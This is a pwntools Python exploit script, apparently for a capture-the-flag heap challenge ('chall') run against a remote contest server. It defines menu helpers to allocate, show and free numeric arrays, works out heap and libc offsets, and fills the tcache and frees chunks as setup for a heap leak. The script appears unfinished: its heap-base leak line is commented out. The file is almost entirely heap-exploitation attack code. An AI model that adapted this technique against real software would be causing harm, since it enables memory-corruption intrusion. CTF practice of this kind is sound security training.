from pwn import *
import re


elf = ELF("./chall")
context.arch = 'amd64'

def new( num, val):
    p.sendlineafter(">",str(1))
    p.sendlineafter(">",str(num))
    for i in val:
        p.sendline(str(i))

def show(idx):
    p.sendlineafter(">",str(2))
    p.sendlineafter(">",str(idx))
    return p.recvuntil("---")

def delete(idx):
    p.sendlineafter(">",str(3))
    p.sendlineafter(">",str(idx))

if args.REM:
    p = remote("tcalc.forfuture.fluxfingers.net",1337)
    libc = ELF("./libc.so.6")
else:
    p = process("./chall")
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.29.so")
    gdb.attach(p,"""

            """)
#LEAK
offset_numbers = (0x000055555555a2d0-0x555555559260)//8
offset_libc = (0x55555555a3b0-0x555555559260)//8 +1
offset_tcache = (0x555555559010 - 0x555555559260) // 8
offset_eostdi = (0x55555555a2d0 - 0x555555559260) // 8

main_arena_offset = 0x1e4c40



info("tcache is full")
new(2, [0, 2]) # 0
new(2, [0, 0]) # 1
new(2, [0, 0]) # 2
new(0x420 // 8, [0 for i in range(0x420 // 8)]) # 3
new(2, [0x71, 0]) # 4
new(0x60 // 8, [0x21 for i in range(0x60 // 8)]) # 5
for i in range(7):
    new(0x60 // 8, [0x21 for i in range(0x60 // 8)]) # 6
    delete(6)
new(4, [1, 2, 3, 4]) # 6
for i in range(3):
    delete(i)

print(offset_eostdi+4*9)
#heap_base = ((show(offset_eostdi + 4 * 9) * 2 - 0x21) - 0x13a0)
p.interactive()
